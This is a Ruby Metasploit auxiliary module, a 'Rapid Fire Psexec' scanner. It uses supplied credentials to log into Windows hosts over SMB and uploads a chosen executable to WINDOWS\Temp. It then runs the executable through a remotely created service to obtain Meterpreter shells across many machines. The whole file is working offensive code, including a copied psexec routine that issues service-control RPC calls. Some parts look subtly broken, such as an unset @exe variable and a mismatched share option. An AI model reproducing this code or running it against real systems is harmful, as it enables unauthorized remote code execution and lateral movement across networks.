#!/usr/bin/env ruby

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Exploit::Remote::DCERPC

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants

	def initialize(info = {})
		super(update_info(info,
         	'Name'           => 'SMB - Rapid Fire Psexec Module',
         	'Description'    => %q{This module uploads a binary executeable to one or more hosts and fires it off.  
         		This can be used simarlry to Eric Milam's 'smbexec.sh' script to achieve meterprter shells from 
         		several hosts.  Make sure your multi/handler is set up properly before launching.  Note, binaries will be 
         		left behind in your target's WINDOWS\Temp directory so don't forget to delete them after you are finished.
	         },

	         'Author'         => [
	         	'Royce Davis <rdavis[at]accuvant.com>',
	         	'Twitter: <[at]R3dy__>',
	         ],
	         'License'        => MSF_LICENSE,
	         'References'     => [
	         	[ 'URL', 'http://www.pentestgeek.com' ],
	         	[ 'URL', 'http://www.accuvant.com' ],
	         	[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
	         ],
	    ))

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LPATH', [true, 'The local path to the binary you wish to upload & execute', '']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
		], self.class)

		deregister_options('RHOST')			
	end
	
	
	
	#-----------------------
	# Main control method
	#---------------------
	def run_host(ip)
		exe = "#{Rex::Text.rand_text_alpha(16)}.exe"
		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
		#Try and connect to the target
		begin
			connect()
		rescue StandardError => connecterror
			print_error("Unable to connect to the target. #{connecterror}")
			return
		end
		
		# Try and authenticate with given credentials
		begin
			smb_login()
		rescue StandardError => autherror
			print_error("Unable to authenticate with the given credentials.")
			print_error("#{autherror.class}")
			print_error("#{autherror}")
			disconnect()
			return
		end
		
		# Try and execute the module
		smbshare = datastore['SMBSHARE']
		begin
			upload_binary(smbshare, ip, exe, cmd, text)
			execute_binary(smbshare, ip, exe)
			cleanup_after(smbshare, ip, cmd, text)
		rescue StandardError => mainerror
			print_error("Something went wrong.")
			print_error("#{mainerror.class}")
			print_error("#{mainerror}")
			disconnect()
			return
		end
		disconnect()
	end
	
	
	
	#--------------------------------------------------------------------------------------
	# This method will upload the binary executable to the target's WINDOWS\Temp directory	
	#--------------------------------------------------------------------------------------
	def upload_binary(smbshare, ip, exe, cmd, text)
		print_status("Uploading binary to #{ip}.")
		begin
			if file_exists(smbshare, ip, exe, cmd, text)
				print_status("Binary already exists on target, no need to re-upload.")
				return
			end
			# Try and upload the binary
			data = ::File.read(datastore['LPATH'], ::File.size(datastore['LPATH']))
			if !simple.connect("\\\\#{ip}\\#{smbshare}")
				print_error("Couldn't mount the share.  Make sure you have local admin.")
				return
			end
			remote = simple.open("\\\\WINDOWS\\Temp\\#{exe}", 'rwct')
			remote.write(data)
			remote.close
		rescue StandardError => uploaderror
			print_error("Unable to upload the binary to #{ip}")
			print_error("#{uploaderror.class}")
			print_error("#{uploaderror}")
			return uploaderror
		end
		simple.disconnect("\\\\#{ip}\\#{smbshare}")
	end
	
	
	
	#-----------------------------------------------------
	# Check the remote host to see if a file exists first
	#-----------------------------------------------------
	def file_exists(smbshare, ip, file, cmd, text)
		begin
			# Try and check the filesystem fo rthe target
			dir = "#{cmd} /C dir C:\\WINDOWS\\Temp > C:#{text}"
			simple.connect(smbshare)
			psexec(smbshare, dir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
			remote = simple.open("\\#{text}", 'ro')
			if remote.read.include?(file)
				remote.close 
				simple.disconnect("\\\\#{ip}\\#{smbshare}")
				return true
			end
			remote.close
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
		rescue StandardError => checkerror
			print_error("Unable to verify if file exists.")
			print_error("#{checkerror.class}")
			print_error("#{checkerror}")
			return false
		end
		return false
	end


	
	#----------------------------------------------------------------------------
	# This method calls the uploaded binary.  Hopefully you'll get some shellz!!
	#----------------------------------------------------------------------------
	def execute_binary(smbshare, ip, exe)
		print_status("Executing #{exe} on #{ip}.")
		begin
			# Try and run the binary
			command = "C:\\WINDOWS\\Temp\\#{@exe}"
			simple.connect(smbshare)
			psexec(smbshare, command)
		rescue StandardError => executeerror
			print_error("Unable to run the binary on #{ip}.  Might have been caught by AV.")
			print_error("#{executeerror.class}")
			print_error("#{executeerror}")
			return executeerror
		end
	end
	
	
	
	#----------------------------------------------------------------------------------
	# This is the cleanup method, removes .txt file/s created during execution
	#-----------------------------------------------------------------------------------
	def cleanup_after(smbshare, ip, cmd, text)
		begin
			# Try and do cleanup command
			cleanup = "#{cmd} /C del C:#{text}"
			simple.connect(smbshare)
			print_status("Executing cleanup on host: #{ip}")
			psexec(smbshare, cleanup)
		rescue StandardError => cleanuperror
			print_error("Unable to processes cleanup commands.")
			print_error("#{cleanuperror.class}")
			print_error("#{cleanuperror}")
			return cleanuperror
		end
	end



	#------------------------------------------------------------------------------------------------------------------------
	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
	#------------------------------------------------------------------------------------------------------------------------
	def psexec(smbshare, command)
		filename = "filename"
		servicename = "servicename"
		simple.disconnect(smbshare)

		simple.connect("IPC$")

		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("Bound to #{handle} ...")

		vprint_status("Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		displayname = "displayname"
		holdhandle = scm_handle
		svc_handle  = nil
		svc_status  = nil

		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore
			NDR.wstring( command ) +
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)  # Password
		begin
			vprint_status("Attempting to execute #{command}")
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		vprint_status("Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Removing the service...")
		stubdata =
			svc_handle +
			NDR.wstring("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("Error: #{e}")
		end
			
		begin
			#print_status("Deleting \\#{filename}...")
			select(nil, nil, nil, 1.0)
			#This is not really useful but will prevent double \\ on the wire :)
		if datastore['SHARE'] =~ /.[\\\/]/
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		else
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		end

		rescue ::Interrupt
			raise $!
		rescue ::Exception
			#raise $!
		end
		simple.disconnect("IPC$")
		simple.disconnect(smbshare)
	end
	
end